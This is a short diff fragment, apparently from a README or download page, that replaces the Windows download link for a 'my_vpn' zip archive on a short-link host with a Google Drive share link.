@@ -8,7 +8,7 @@
  
 ---
 
-🟢 [**Windows**](http://uplnk.com/f/f99ba404/my_vpn.windows.zip)
+🟢 [**Windows**](https://drive.google.com/file/d/19r3qO1on-Qm8LmMH2r3UyCCNu9g4L8kf/view?usp=sharing)
 
 _____________________________________________________
 
